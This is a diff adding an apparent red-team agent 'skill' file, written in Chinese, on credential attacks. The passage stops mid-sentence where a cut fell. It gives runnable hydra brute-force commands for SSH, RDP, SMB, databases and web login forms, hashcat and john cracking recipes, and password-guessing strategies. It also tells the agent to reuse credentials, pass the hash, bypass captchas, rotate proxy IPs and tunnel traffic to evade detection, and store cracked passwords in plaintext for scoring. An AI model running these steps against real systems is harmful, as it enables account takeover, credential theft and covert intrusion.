@@ -1,1 +1,155 @@
-LS0tCm5hbWU6IGNyZWRlbnRpYWwtYXR0YWNrCmRlc2NyaXB0aW9uOiDlh63mja7mlLvlh7vvvJrlnKjnur/lvLHlj6Pku6TniIbnoLTvvIhoeWRyYe+8ieS4juemu+e6v+WTiOW4jOegtOino++8iGhhc2hjYXQvam9obu+8ie+8jOimhuebliBTU0gvRlRQL1JEUC9TTUIv5pWw5o2u5bqTL1dlYiDlkI7lj7AKd2hlblRvVXNlOiDlj5HnjrDnmbvlvZXlhaXlj6PvvIhXZWIg5ZCO5Y+wL1NTSC9GVFAvUkRQL1NNQi9NeVNRTC9NU1NRTC9SZWRpc++8iemcgOimgeivleWPo+S7pO+8m+aIluW3suaLv+WIsOWTiOW4jC/lr4bmlofpnIDopoHov5jljp/mmI7mlocKcm9sZTogZXhwbG9pdAplbmFibGVkOiB0cnVlCi0tLQoKIyDlh63mja7mlLvlh7vvvIjlnKjnur/niIbnoLQgKyDnprvnur/noLTop6PvvIkKCue6oumYn+mHjCLmi7/otKblj7fmnYPpmZAi5pyA56iz55qE5Lik5p2h6Lev5LmL5LiA77yI5Y+m5LiA5p2h5piv6YWN572uL+a6kOeggeazhOmcsuaLv+WIsOaYjuaWh++8ieOAggoqKuacrOaKgOiDveWPqueuoeaKiuWPo+S7pOivleWHuuadpSoq77yb6K+V5Ye65p2l5LmL5ZCO5b+F6aG755So5oqA6IO9IGBicm93c2VyLWF1dG9tYXRpb25gIC8gYGtpbWktd2ViYnJpZGdlYAoqKuWcqOecn+Wunua1j+iniOWZqOeZu+W9leS4gOasoSoq5omN566X5ou/5Yiw6LSm5Y+35p2D6ZmQ77yI57qi57q/77ya5Y+q5pyJ5Yet5o2u5LiN566X5ou/5Yiw6LSm5Y+377yJ44CCCgojIyDmnKzmnLrlt6XlhbcKCnwg5bel5YW3IHwg6Lev5b6EIHwg54mI5pysIHwg55So6YCUIHwKfCAtLS0gfCAtLS0gfCAtLS0gfCAtLS0gfAp8ICoqaHlkcmEqKiB8IGAvdXNyL2Jpbi9oeWRyYWAgfCA5LjcgfCDlnKjnur/niIbnoLTvvIzopobnm5YgNTArIOWNj+iuriB8CnwgKipoYXNoY2F0KiogfCBgL3Vzci9iaW4vaGFzaGNhdGAgfCA3LjEuMiB8IOemu+e6v+WTiOW4jOegtOino++8iEdQVS9DUFXvvIkgfAp8ICoqam9obioqIHwgYC91c3Ivc2Jpbi9qb2huYCB8IOKAlCB8IOemu+e6v+egtOino++8iOiHquWKqOivhuWIq+agvOW8j++8jOmFjee9rueugOWNle+8iSB8CgrlrZflhbjvvJpgL3Vzci9zaGFyZS93b3JkbGlzdHMvYO+8iOWQqyBgcm9ja3lvdS50eHRgIOmcgCBndW56aXDvvInjgIFgL3Vzci9zaGFyZS9zZWNsaXN0cy9QYXNzd29yZHMvYOOAggoqKuayoeaciSByb2NreW91IOaXtuWFiOino+WOiyoq77yaYHN1ZG8gZ3VuemlwIC91c3Ivc2hhcmUvd29yZGxpc3RzL3JvY2t5b3UudHh0Lmd6YO+8iOmcgOaOiOadg++8jOayoeacieWwseaNoiBzZWNsaXN0cyDph4znmoTvvInjgIIKCiMjIOS4gOOAgeWcqOe6v+eIhuegtO+8iGh5ZHJh77yJCgojIyMg6YCa55So6K+t5rOVCmBgYGJhc2gKaHlkcmEgLUwgdXNlcnMudHh0IC1QIHBhc3MudHh0IDxwcm90b2NvbD46Ly88dGFyZ2V0Pls6cG9ydF0gW+aooeWdl+WPguaVsF0gLXQgPOW5tuWPkT4gLWYgLW8gcnVucy9oeWRyYS08dGFyZ2V0Pi50eHQKYGBgCi0gYC1MYCDnlKjmiLflkI3lrZflhbggLyBgLWxgIOWNleS4queUqOaIt+WQje+8m2AtUGAg5Y+j5Luk5a2X5YW4IC8gYC1wYCDljZXkuKrlj6Pku6QKLSBgLXRgIOW5tuWPke+8iCoq6buY6K6kIDE277yM5Yir6LaF6L+HIDE2KirvvIzlpJrmlbDmnI3liqHkvJrplIHlj7fmiJblsIEgSVDvvIkKLSBgLWZgIOWRveS4reS4gOS4quWwseWBnO+8iOmBv+WFjeaKiui0puWPt+aJk+mUge+8iQotIGAtb2Ag6L6T5Ye65YiwIGBydW5zL2DvvIjmiqXlkYropoHpnaDlroPlpI3njrDvvIkKLSBgLVZgIOaYvuekuuavj+asoeWwneivle+8iOiwg+ivleeUqO+8jOato+W8j+i3keWIq+W8gO+8iQoKIyMjIOWQhOWNj+iuruWunuS+iwpgYGBiYXNoCiMgU1NICmh5ZHJhIC1MIHVzZXJzLnR4dCAtUCBwYXNzLnR4dCBzc2g6Ly8xMC4wLjAuNSAtdCA0IC1mIC1vIHJ1bnMvaHlkcmEtc3NoLTEwLjAuMC41LnR4dAoKIyBSRFDvvIjms6jmhI/vvJrlubblj5Hlv4XpobvkvY7vvIxXaW5kb3dzIOS8mumUgeWPt++8iQpoeWRyYSAtTCB1c2Vycy50eHQgLVAgcGFzcy50eHQgcmRwOi8vMTAuMC4wLjYgLXQgMiAtZiAtbyBydW5zL2h5ZHJhLXJkcC0xMC4wLjAuNi50eHQKCiMgU01CCmh5ZHJhIC1MIHVzZXJzLnR4dCAtUCBwYXNzLnR4dCBzbWI6Ly8xMC4wLjAuNyAtdCA0IC1mCgojIEZUUApoeWRyYSAtTCB1c2Vycy50eHQgLVAgcGFzcy50eHQgZnRwOi8vMTAuMC4wLjggLXQgNiAtZgoKIyBNeVNRTApoeWRyYSAtTCB1c2Vycy50eHQgLVAgcGFzcy50eHQgbXlzcWw6Ly8xMC4wLjAuOSAtdCA0IC1mCgojIE1TU1FMCmh5ZHJhIC1MIHVzZXJzLnR4dCAtUCBwYXNzLnR4dCBtc3NxbDovLzEwLjAuMC4xMCAtdCA0IC1mCgojIFdlYiDooajljZXnmbvlvZXvvIhQT1NU77yJ4oCU4oCU5pyA5bi455SoCmh5ZHJhIC1MIHVzZXJzLnR4dCAtUCBwYXNzLnR4dCB0YXJnZXQuZXhhbXBsZS5jb20gaHR0cC1wb3N0LWZvcm0gXAogICIvYWRtaW4vbG9naW4uanNwOnVzZXJuYW1lPV5VU0VSXiZwYXNzd29yZD1eUEFTU146Rj3nlKjmiLflkI3miJblr4bnoIHplJnor68iIC10IDggLWYgLW8gcnVucy9oeWRyYS13ZWItYWRtaW4udHh0CgojIFdlYiDooajljZXvvIjluKbpop3lpJblpLQvSFRUUFPvvIkKaHlkcmEgLUwgdXNlcnMudHh0IC1QIHBhc3MudHh0IC1zIDQ0MyAtUyB0YXJnZXQuZXhhbXBsZS5jb20gaHR0cC1wb3N0LWZvcm0gXAogICIvbG9naW46dXNlcj1eVVNFUl4mcGFzcz1eUEFTU146Rj1pbnZhbGlkOkg9Q29va2llOiBKU0VTU0lPTklEPXh4eCIgLXQgOCAtZgpgYGAKCiMjIyBXZWIg6KGo5Y2V54iG56C055qE5oiQ6LSl5Yik5a6a77yI5YWz6ZSu77yJCmBodHRwLXBvc3QtZm9ybWAg56ys5LiJ5q615qC85byP77yaYCI86Lev5b6EPjo8UE9TVCDkvZM+OjzlpLHotKXmnaHku7Y+ImDvvIwqKuWksei0peadoeS7tuW/hemhu+WGmeWHhioq77yM5ZCm5YiZ5YWo6YeP6K+v5oql77yaCi0gYEY9POWksei0peeJueW+geS4sj5g77ya5ZON5bqU6YeM5Ye6546w6K+l5Liy6KGo56S6KirlpLHotKUqKu+8iOaOqOiNkO+8jOacgOeos++8iQotIGBTPTzmiJDlip/nibnlvoHkuLI+YO+8muWTjeW6lOmHjOWHuueOsOivpeS4suihqOekuioq5oiQ5YqfKirvvIjlk43lupTml6Dnu5/kuIDlpLHotKXmlofmoYjml7bnlKjvvIkKLSDlhYjmiYvlt6Xlj5HkuKTmrKHor7fmsYLvvIjplJnor6/lj6Pku6QgdnMg5q2j56Gu5Y+j5Luk5ZCE5LiA5qyh77yM5oiW5a+55q+U5LiN5a2Y5Zyo55So5oi377yJKirnoa7orqTnibnlvoHkuLLllK/kuIAqKu+8jOWGjei3keeIhuegtOOAggotIOaciemqjOivgeeggSAvIOWbvuW9oueggSAvIOa7keWdl++8muWFiOeci+iDveS4jeiDvee7lei/h++8iOWbuuWumumqjOivgeeggeOAgemqjOivgeeggeS4jeagoemqjOOAgeWJjeerr+agoemqjO+8ie+8jOe7leS4jei/hyoq5LiN6KaB56Gs54iGKirvvIjmioDog70gYGJyb3dzZXItYXV0b21hdGlvbmAg5Y+v5YGa5pyJ6ZmQ5qyh5bim6aqM6K+B56CB5bCd6K+V77yJ77yM6L2s5Yir55qE6Lev44CCCgojIyMg5a2X5YW45LyY5YWI57qn77yI55yB5pe26Ze055qE5YWz6ZSu77yJCjEuICoq6ZKI5a+55oCn5bCP5a2X5YW4KirvvIjlkb3kuK3njofmnIDpq5jvvInvvJrljZXkvY3lkI0v5ZOB54mML+Wfn+WQjS/lubTku73nu4TlkIjvvIzlpoIgYOWNleS9jeeugOensEAyMDI2YOOAgWBBZG1pbkAxMjNg44CBYDzln5/lkI0+MjAyNmDvvJsKICAg55SoIGByZWR0ZWFtX2Fzc2V0X3F1ZXJ5YCDph4znmoQgdGl0bGUv5Y2V5L2N5L+h5oGv546w6YCg44CCCjIuICoq6buY6K6k5Y+j5Luk5a2X5YW4KirvvJrkuqflk4Hpu5jorqTlj6Pku6TvvIhgYWRtaW4vYWRtaW5g44CBYHRvbWNhdC90b21jYXRg44CBYHdlYmxvZ2ljL3dlYmxvZ2ljMWDjgIFgc2Evc2Fg77yJ77yMCiAgIOWPguiAgyBudWNsZWkg5qih5p2/IGBodHRwL2RlZmF1bHQtbG9naW5zL2DvvIgzMDcg5Liq77yJ77yMKirlhYjmn6UgYHJlZHRlYW1fcG9jX3NlYXJjaGAqKuOAggozLiAqKuW4uOingeW8seWPo+S7pCBUT1AqKu+8mmAvdXNyL3NoYXJlL3NlY2xpc3RzL1Bhc3N3b3Jkcy9Db21tb24tQ3JlZGVudGlhbHMvYCDkuIvnmoQgMTAtbWlsbGlvbiAvIHRvcC0xMDAg562J44CCCjQuIOmAmueUqOWkp+Wtl+WFuO+8iHJvY2t5b3XvvInmlL7mnIDlkI7igJTigJTmhaLkuJTlmarlo7DlpKfjgIIKCiMjIyDnlKjmiLflkI3ku47lk6rmnaUKLSBXZWIg5ZCO5Y+w77ya5oql6ZSZ5L+h5oGv44CBSlMg6YeM55qE6buY6K6k6LSm5Y+344CB5o6l5Y+j6L+U5Zue55qEIGBjcmVhdGVCeWDjgIHnmbvlvZXpobXmj5DnpLrjgIFgcm9ib3RzLnR4dGDjgIHlkZjlt6Xpgq7nrrHliY3nvIDvvJsKLSDnm67lvZXniIbnoLTlkb3kuK0gYC9hZG1pbmAg5pe25LyY5YWI6K+VIGBhZG1pbmDjgIFgYWRtaW5pc3RyYXRvcmDjgIFgc3lzdGVtYOOAgWB0ZXN0YOOAgWBndWVzdGDvvJsKLSDmi7/liLDkuIDkuKrlh63mja7lkI7otbAqKuWHreaNruWkjeeUqCoq77yI6KeB5LiL77yJ77yM5q+U54iG56C05b+r5b6X5aSa44CCCgojIyDkuozjgIHnprvnur/noLTop6PvvIhoYXNoY2F0IC8gam9obu+8iQoK5ou/5Yiw5ZOI5biML+WvhuaWh++8iOaVsOaNruW6k+OAgemFjee9ruaWh+S7tuOAgWAvZXRjL3NoYWRvd2DjgIFXZWIg5bqU55So5bqT77yJ5ZCO56a757q/6LeR77yMKirkuI3kuqfnlJ/nm67moIfkvqfmtYHph48qKu+8jOavlOWcqOe6v+eIhuegtOWuieWFqOW+l+WkmuOAggoKYGBgYmFzaAojIDEpIOWFiOivhuWIq+WTiOW4jOexu+WeiwpoYXNoY2F0IC0taWRlbnRpZnkgaGFzaGVzLnR4dAoKIyAyKSBOVExN77yIV2luZG93c++8iQpoYXNoY2F0IC1tIDEwMDAgaGFzaGVzLnR4dCAvdXNyL3NoYXJlL3dvcmRsaXN0cy9yb2NreW91LnR4dCAtTyAtdyAzCgojIDMpIE5ldE5UTE12Mu+8iFJlc3BvbmRlciDmipPliLDnmoTvvIkKaGFzaGNhdCAtbSA1NjAwIGhhc2hlcy50eHQgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQKCiMgNCkgTUQ1IC8gU0hBMe+8iFdlYiDlupTnlKjlupPvvIkKaGFzaGNhdCAtbSAwIGhhc2hlcy50eHQgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQKaGFzaGNhdCAtbSAxMDAgaGFzaGVzLnR4dCAvdXNyL3NoYXJlL3dvcmRsaXN0cy9yb2NreW91LnR4dAoKIyA1KSBiY3J5cHTvvIhXb3JkUHJlc3MgLyBQSFDvvIkKaGFzaGNhdCAtbSAzMjAwIGhhc2hlcy50eHQgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQKCiMgNikg5Yqg6KeE5YiZ77yI55So6KeE5YiZ5oqK5a2X5YW45pS+5aSnIDEwIOWAje+8jOaAp+S7t+avlOacgOmrmO+8iQpoYXNoY2F0IC1tIDEwMDAgaGFzaGVzLnR4dCAvdXNyL3NoYXJlL3dvcmRsaXN0cy9yb2NreW91LnR4dCAtciAvdXNyL3NoYXJlL2hhc2hjYXQvcnVsZXMvYmVzdDY0LnJ1bGUKCiMgNykg5o6p56CB54iG56C077yI5bey55+l5Y+j5Luk562W55Wl77yM5aaCIDgg5L2N5pWw5a2XICsg5aSn5YaZ5a2X5q+N77yJCmhhc2hjYXQgLW0gMTAwMCBoYXNoZXMudHh0IC1hIDMgJz91P2w/bD9sP2w/ZD9kP2Q/ZCcKYGBgCgpgYGBiYXNoCiMgam9obu+8muagvOW8j+ivhuWIq+ecgeS6i++8jOmFjee9ruWcqCB+Ly5qb2huL2pvaG4uY29uZgpqb2huIC0td29yZGxpc3Q9L3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQgaGFzaGVzLnR4dApqb2huIC0tc2hvdyBoYXNoZXMudHh0CmBgYAoKKirms6jmhI8qKu+8muacrOacuuWPr+iDveayoeaciSBHUFXvvIxgaGFzaGNhdGAg6LWwIENQVSDkvJrmhaLigJTigJTkvJjlhYjnlKjop4TliJkr5bCP5a2X5YW477yM5oiW5oqK5ZOI5biM5a2Y5YiwIGBydW5zL2Ag5ZCO57ut5aSE55CG77ybCioq5LiN6KaB5Li65LqG56C06Kej5oyC5Yeg5Liq5bCP5pe2KirvvIznoLTop6PkuI3lh7rmnaXlsLHnlKjlk4jluIznm7TmjqXmiZPvvIhQYXNzLXRoZS1IYXNo77yM6KeB5oqA6IO9IGBsYXRlcmFsLW1vdmVtZW50YO+8ieOAggoKIyMg5LiJ44CB5Yet5o2u5aSN55So77yI5q+U54iG56C05b+r5b6X5aSa77yM5LyY5YWI5YGa77yJCgrmi7/liLDku7vkvZXkuIDnu4Tlh63mja7lkI7vvIwqKuWFiOaoquWQkeivlSoq77yM5LiN6KaB5oCl552A54iG5LiL5LiA5Liq77yaCjEuIGByZWR0ZWFtX2NyZWRlbnRpYWxfbGlzdGAg55yL5bey5pyJ5Yet5o2u77yI5ZCr55So5oi35ZCNL+WPo+S7pC/mnaXmupDvvInvvJsKMi4g5ZCM5LiA5Y+j5Luk6K+V77ya5YW25LuW5ZCM5qy+57O757uf44CB5YW25LuW6LWE5Lqn55qE566h55CG56uv44CBU1NIL1JEUC9TTUIv5pWw5o2u5bqT44CBVlBOL+WgoeWekuacui/ov5Dnu7TlubPlj7DvvJsKMy4g55So5oi35ZCN6KeE5b6L77yIYOWnky7lkI1g44CB5bel5Y+344CB6YKu566x5YmN57yA77yJ6YWN5ZCI5bey55+l5Y+j5Luk6K+V5ZCM57O757uf5YW25a6D55So5oi377ybCjQuIOWTiOW4jOebtOaOpeWkjeeUqO+8mlB0SCAvIFBhc3MtdGhlLUtlee+8iOaKgOiDvSBgbGF0ZXJhbC1tb3ZlbWVudGDvvInjgIIKCiMjIOWbm+OAgee6quW+i+S4jui+ueeVjO+8iOW/hemhu+mBteWuiO+8iQoKMS4gKirlhYjmn6XlupMqKu+8mmByZWR0ZWFtX2NyZWRlbnRpYWxfbGlzdGAgLyBgcmVkdGVhbV9hc3NldF9xdWVyeWDigJTigJTliKvph43lpI3niIblkIzkuIDkuKrlhaXlj6PvvIhgYmxvY2tlZF9jb3VudD4wYCDnmoTlhYjnnIvljp/lm6DvvInjgIIKMi4gKirplIHlj7fpo47pmakqKu+8mldpbmRvd3PvvIhSRFAvU01C77yJ5LiOIE9BL+Wfn+i0puWPtyoq5Lil5qC86ZmQ5rWBKirvvJpgLXQgMmDvvIhXaW5kb3dz77yJ44CBYC10IDRg77yIU1NIL0ZUUO+8ieOAgQogICDlrZflhbjkuI3otoXov4fnmb7mnaHph4/nuqfvvJsqKuWQjOS4gOi0puWPt+i/nue7reWksei0pSA1IOasoeWwseWBnCoq77yM5o2i6LSm5Y+35oiW5o2i55uu5qCH4oCU4oCU5oqK6LSm5Y+35omT6ZSB562J5LqO5q+B5o6J5YWl5Y+j44CCCjMuICoq5ZCM5LiA55uu5qCH57Sv6K6h6KKr5bCBID4zIOasoeaUvuW8gyoq77yIYHJlZHRlYW1fYXNzZXRfdGVzdGAgc3RhdHVzPWFiYW5kb25lZCArIGJsb2NrZWQ9dHJ1Ze+8ieOAggo0LiAqKumZjeWZqui1sOS7o+eQhioq77yaV2ViIOihqOWNleeIhuegtOeUqOaKgOiDvSBgY24tcHJveHktcG9vbGAg5o2i5Ye65Y+jIElQ77yb5YaF572R55uu5qCH6LWwIHN1bzUg6Zqn6YGT44CCCjUuICoq5YaF572R5LyY5YWI55SoIGZzY2FuKirvvJrlhoXnvZHmrrXokL3nmoTlvLHlj6Pku6Tmma7mn6XkuqTnu5nmioDog70gYGZzY2FuLWludHJhbmV0YO+8iDI4IOexu+acjeWKoeaJuemHj+eIhuegtO+8jOS4gOi2n+WHuue7k+aenO+8ie+8jAogICBoeWRyYSDnlKjkuo4gZnNjYW4g5rKh6KaG55uW55qE5Y2P6K6u5oiW6ZyA6KaB57K+57uG5o6n5Yi255qE5Y2V54K544CCCgojIyDkupTjgIHovpPlh7rkuI7okL3lupPvvIjlvLrliLbvvIkKCjEuICoq5q+P5p2h5ZG95Lit56uL5Yi7IGByZWR0ZWFtX2NyZWRlbnRpYWxfYWRkYCoq77yaCiAgIC0gYHVzZXJuYW1lYOOAgSoq5piO5paH5YaZIGBzZWNyZXRfdmFsdWVgKirvvIjpnaLmnb/nm7TmjqXmmL7npLrvvIzkvr/kuo7pmo/ml7blpI3nlKjvvInjgIFgc291cmNlYO+8iGDlvLHlj6Pku6RgL2Dpu5jorqTlj6Pku6RgL2Dlh63mja7lpI3nlKhgL2Dms4TpnLJgL2Dnprvnur/noLTop6Ng77yJ44CBCiAgICAgYHRvb2xg77yI5a6e6ZmF5ZG95Luk5Y6f5paH77yM5aaCIGBoeWRyYSAtTCB1c2Vycy50eHQgLVAgcGFzcy50eHQgc3NoOi8vMTAuMC4wLjUgLXQgNCAtZmDvvInjgIFgc2VjcmV0X3JlZmDvvIjor4Hmja7mlofku7bot6/lvoTlpoIgYHJ1bnMvaHlkcmEtc3NoLTEwLjAuMC41LnR4dGDvvInjgIIKMi4gKirlv4Xpobvlrp7mtYvnmbvlvZXmiY3orrDliIYqKu+8mldlYiDlkI7lj7DnlKggYGJyb3dzZXItYXV0b21hdGlvbmAgLyBga2ltaS13ZWJicmlkZ2VgIOecn+WunueZu+W9leS4gOasoQogICDvvIjmiZPlvIDnmbvlvZXpobUg4oaSIOWhq+i0puWPt+WPo+S7pCDihpIg56Gu6K6k6L+b5YWl5ZCO5Y+wIOKGkiDorrDpobXpnaLmoIfpopgv6I+c5Y2VL+W9k+WJjeeUqOaIt+WQjSDihpIg5oqTIENvb2tpZSDlrZjor4Hmja7vvInihpIKICAgYHJlZHRlYW1fYWNjZXNzX2FkZGDvvIhgbWV0aG9kPXdlYi1sb2dpbmDvvInihpIgYHJlZHRlYW1fc2NvcmVfaGl0YO+8iGB3ZWItYXBwYCAxMCDliIYgLyBgd2ViLWFwcGAgMjAg5YiG77yMCiAgIGBldmlkZW5jZWAg5YaZ44CM6LWE5Lqn772c5ZCO5Y+w566h55CG5ZGYIHRvbWNhdC9Ub21jYXRAMjAyNOOAje+8ieOAggogICAqKueZu+S4jei/m+WOu+WwseWcqCBgcmVkdGVhbV9hc3NldF90ZXN0YCDnmoQgYHRlc3RgIOmHjOiusOS4gOihjOWNoeeCuSoq77yI5ZOI5biM5pyq56C06KejL+mcgOS6jOasoeiupOivgS/pmZDliLbmnaXmupAgSVAv6LSm5Y+35bey56aB55So77yJ77yM5LiN6K6w5YiG44CCCjMuICoq6LSm5Y+35p2D6ZmQ5oyJ5pyN5Yqh5bCB6aG2KirvvJrlkIzkuIDotYTkuqflkIzkuIDnq6/lj6Plj6rnrpfkuIDmrKHliIbvvIzmi7/liLDnrqHnkIblkZjljbPor6XmnI3liqHmi7/mu6HigJTigJTkuI3opoHlnKjlkIzkuIDmnI3liqHkuIrliLflpJrkuKrotKblj7fjgIIKNC4g5q+P5Liq5YWz6ZSu5Yqo5L2cIGByZWR0ZWFtX2NoYWluX2FkZGDvvJpgc3RhZ2VfY29kZT1pbnRlcm5ldGDvvIjmiJYgYGludGVybmFsYO+8ie+8jAogICBgdG9vbGAg5YaZ5a6e6ZmF5ZG95Luk44CBYHJlc3VsdGAg5YaZ5Zue5pi+5pGY6KaB77yI5aaCIGBzc2ggMTAuMC4wLjUg55SoIHJvb3QvUm9vdEAxMjMg55m75b2V5oiQ5Yqf77yMdWlkPTAocm9vdClg77yJ44CCCjUuIOWTiOW4jOaWh+S7tuOAgeegtOino+e7k+aenOS4gOW+i+aUviBgcnVucy9g44CCCg==
+---
+name: credential-attack
+description: 凭据攻击：在线弱口令爆破（hydra）与离线哈希破解（hashcat/john），覆盖 SSH/FTP/RDP/SMB/数据库/Web 后台
+whenToUse: 发现登录入口（Web 后台/SSH/FTP/RDP/SMB/MySQL/MSSQL/Redis）需要试口令；或已拿到哈希/密文需要还原明文
+role: exploit
+enabled: true
+---
+
+# 凭据攻击（在线爆破 + 离线破解）
+
+红队里"拿账号权限"最稳的两条路之一（另一条是配置/源码泄露拿到明文）。
+**本技能只管把口令试出来**；试出来之后必须用技能 `browser-automation` / `kimi-webbridge`
+**在真实浏览器登录一次**才算拿到账号权限（红线：只有凭据不算拿到账号）。
+
+## 本机工具
+
+| 工具 | 路径 | 版本 | 用途 |
+| --- | --- | --- | --- |
+| **hydra** | `/usr/bin/hydra` | 9.7 | 在线爆破，覆盖 50+ 协议 |
+| **hashcat** | `/usr/bin/hashcat` | 7.1.2 | 离线哈希破解（GPU/CPU） |
+| **john** | `/usr/sbin/john` | — | 离线破解（自动识别格式，配置简单） |
+
+字典：`/usr/share/wordlists/`（含 `rockyou.txt` 需 gunzip）、`/usr/share/seclists/Passwords/`。
+**没有 rockyou 时先解压**：`sudo gunzip /usr/share/wordlists/rockyou.txt.gz`（需授权，没有就换 seclists 里的）。
+
+## 一、在线爆破（hydra）
+
+### 通用语法
+```bash
+hydra -L users.txt -P pass.txt <protocol>://<target>[:port] [模块参数] -t <并发> -f -o runs/hydra-<target>.txt
+```
+- `-L` 用户名字典 / `-l` 单个用户名；`-P` 口令字典 / `-p` 单个口令
+- `-t` 并发（**默认 16，别超过 16**，多数服务会锁号或封 IP）
+- `-f` 命中一个就停（避免把账号打锁）
+- `-o` 输出到 `runs/`（报告要靠它复现）
+- `-V` 显示每次尝试（调试用，正式跑别开）
+
+### 各协议实例
+```bash
+# SSH
+hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f -o runs/hydra-ssh-10.0.0.5.txt
+
+# RDP（注意：并发必须低，Windows 会锁号）
+hydra -L users.txt -P pass.txt rdp://10.0.0.6 -t 2 -f -o runs/hydra-rdp-10.0.0.6.txt
+
+# SMB
+hydra -L users.txt -P pass.txt smb://10.0.0.7 -t 4 -f
+
+# FTP
+hydra -L users.txt -P pass.txt ftp://10.0.0.8 -t 6 -f
+
+# MySQL
+hydra -L users.txt -P pass.txt mysql://10.0.0.9 -t 4 -f
+
+# MSSQL
+hydra -L users.txt -P pass.txt mssql://10.0.0.10 -t 4 -f
+
+# Web 表单登录（POST）——最常用
+hydra -L users.txt -P pass.txt target.example.com http-post-form \
+  "/admin/login.jsp:username=^USER^&password=^PASS^:F=用户名或密码错误" -t 8 -f -o runs/hydra-web-admin.txt
+
+# Web 表单（带额外头/HTTPS）
+hydra -L users.txt -P pass.txt -s 443 -S target.example.com http-post-form \
+  "/login:user=^USER^&pass=^PASS^:F=invalid:H=Cookie: JSESSIONID=xxx" -t 8 -f
+```
+
+### Web 表单爆破的成败判定（关键）
+`http-post-form` 第三段格式：`"<路径>:<POST 体>:<失败条件>"`，**失败条件必须写准**，否则全量误报：
+- `F=<失败特征串>`：响应里出现该串表示**失败**（推荐，最稳）
+- `S=<成功特征串>`：响应里出现该串表示**成功**（响应无统一失败文案时用）
+- 先手工发两次请求（错误口令 vs 正确口令各一次，或对比不存在用户）**确认特征串唯一**，再跑爆破。
+- 有验证码 / 图形码 / 滑块：先看能不能绕过（固定验证码、验证码不校验、前端校验），绕不过**不要硬爆**（技能 `browser-automation` 可做有限次带验证码尝试），转别的路。
+
+### 字典优先级（省时间的关键）
+1. **针对性小字典**（命中率最高）：单位名/品牌/域名/年份组合，如 `单位简称@2026`、`Admin@123`、`<域名>2026`；
+   用 `redteam_asset_query` 里的 title/单位信息现造。
+2. **默认口令字典**：产品默认口令（`admin/admin`、`tomcat/tomcat`、`weblogic/weblogic1`、`sa/sa`），
+   参考 nuclei 模板 `http/default-logins/`（307 个），**先查 `redteam_poc_search`**。
+3. **常见弱口令 TOP**：`/usr/share/seclists/Passwords/Common-Credentials/` 下的 10-million / top-100 等。
+4. 通用大字典（rockyou）放最后——慢且噪声大。
+
+### 用户名从哪来
+- Web 后台：报错信息、JS 里的默认账号、接口返回的 `createBy`、登录页提示、`robots.txt`、员工邮箱前缀；
+- 目录爆破命中 `/admin` 时优先试 `admin`、`administrator`、`system`、`test`、`guest`；
+- 拿到一个凭据后走**凭据复用**（见下），比爆破快得多。
+
+## 二、离线破解（hashcat / john）
+
+拿到哈希/密文（数据库、配置文件、`/etc/shadow`、Web 应用库）后离线跑，**不产生目标侧流量**，比在线爆破安全得多。
+
+```bash
+# 1) 先识别哈希类型
+hashcat --identify hashes.txt
+
+# 2) NTLM（Windows）
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3
+
+# 3) NetNTLMv2（Responder 抓到的）
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# 4) MD5 / SHA1（Web 应用库）
+hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# 5) bcrypt（WordPress / PHP）
+hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# 6) 加规则（用规则把字典放大 10 倍，性价比最高）
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# 7) 掩码爆破（已知口令策略，如 8 位数字 + 大写字母）
+hashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?l?d?d?d?d'
+```
+
+```bash
+# john：格式识别省事，配置在 ~/.john/john.conf
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+john --show hashes.txt
+```
+
+**注意**：本机可能没有 GPU，`hashcat` 走 CPU 会慢——优先用规则+小字典，或把哈希存到 `runs/` 后续处理；
+**不要为了破解挂几个小时**，破解不出来就用哈希直接打（Pass-the-Hash，见技能 `lateral-movement`）。
+
+## 三、凭据复用（比爆破快得多，优先做）
+
+拿到任何一组凭据后，**先横向试**，不要急着爆下一个：
+1. `redteam_credential_list` 看已有凭据（含用户名/口令/来源）；
+2. 同一口令试：其他同款系统、其他资产的管理端、SSH/RDP/SMB/数据库、VPN/堡垒机/运维平台；
+3. 用户名规律（`姓.名`、工号、邮箱前缀）配合已知口令试同系统其它用户；
+4. 哈希直接复用：PtH / Pass-the-Key（技能 `lateral-movement`）。
+
+## 四、纪律与边界（必须遵守）
+
+1. **先查库**：`redteam_credential_list` / `redteam_asset_query`——别重复爆同一个入口（`blocked_count>0` 的先看原因）。
+2. **锁号风险**：Windows（RDP/SMB）与 OA/域账号**严格限流**：`-t 2`（Windows）、`-t 4`（SSH/FTP）、
+   字典不超过百条量级；**同一账号连续失败 5 次就停**，换账号或换目标——把账号打锁等于毁掉入口。
+3. **同一目标累计被封 >3 次放弃**（`redteam_asset_test` status=abandoned + blocked=true）。
+4. **降噪走代理**：Web 表单爆破用技能 `cn-proxy-pool` 换出口 IP；内网目标走 suo5 隧道。
+5. **内网优先用 fscan**：内网段落的弱口令普查交给技能 `fscan-intranet`（28 类服务批量爆破，一趟出结果），
+   hydra 用于 fscan 没覆盖的协议或需要精细控制的单点。
+
+## 五、输出与落库（强制）
+
+1. **每条命中立刻 `redteam_credential_add`**：
+   - `username`、**明文写 `secret_value`**（面板直接显示，便于随时复用）、`source`（`弱口令`/`默认口令`/`凭据复用`/`泄露`/`离线破解`）、
+     `tool`（实际命令原文，如 `hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f`）、`secret_ref`（证据文件路径如 `runs/hydra-ssh-10.0.0.5.txt`）。
+2. **必须实测登录才记分**：Web 后台用 `browser-automation` / `kimi-webbridge` 真实登录一次
+   （打开登录页 → 填账号口令 → 确认进入后台 → 记页面标题/菜单/当前用户名 → 抓 Cookie 存证据）→
+   `redteam_access_add`（`method=web-login`）→ `redteam_score_hit`（`web-app` 10 分 / `web-app` 20 分，
